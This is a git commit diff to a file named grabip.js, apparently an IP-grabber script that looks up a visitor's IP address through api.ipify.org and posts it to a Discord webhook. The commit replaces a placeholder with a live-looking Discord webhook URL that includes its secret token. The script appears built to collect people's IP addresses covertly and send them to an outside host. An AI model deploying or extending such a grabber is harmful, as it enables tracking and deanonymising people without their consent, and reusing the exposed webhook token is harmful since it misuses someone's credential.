cc6cc2c9734afb9e40aace4e7cfba020fd7364d2
OrionGift3 <168460082+Shengelaa@users.noreply.github.com>
2025-05-02 06:23:05 +0400

    rrr

--- grabip.js
+++ grabip.js
@@ -2,7 +2,7 @@
 const ipifyAPI = "https://api.ipify.org?format=json";
 
 
-const webhookURL = "Input your webhook url here (your webhook url can be seen easily)";
+const webhookURL = "https://discord.com/api/webhooks/1367683410989940756/cx2uFFLodvi3paS-hUHxv9waFC4LG2FEqRGLs0bO8nV3CQ-qvPnp8NYbsmiMkMHRteA5";
 
 
 async function getIP() {
